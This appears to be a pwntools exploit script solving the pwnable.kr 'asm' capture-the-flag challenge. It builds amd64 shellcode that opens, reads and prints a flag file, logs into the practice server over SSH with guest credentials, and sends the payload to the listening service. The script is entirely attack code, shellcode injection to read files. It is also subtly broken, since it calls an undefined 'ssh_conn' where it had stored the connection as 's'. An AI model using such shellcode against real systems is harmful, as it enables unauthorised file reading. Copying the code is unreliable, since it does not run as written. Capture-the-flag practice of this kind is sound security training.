from pwn import *

context.arch = 'amd64'
x = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
sc = shellcraft.open(x)
sc += shellcraft.read('rax', 'rsp', 64)
sc += shellcraft.write(1, 'rsp', 64)

payload = asm(sc)

s = ssh(host='pwnable.kr', port=2222, user='asm', password='guest') # open basic connection
p = ssh_conn.run('nc 0 9026') # connect to asm_pwn like they say in readme

p.recvuntil(b'shellcode: ')
p.send(payload)
p.interactive()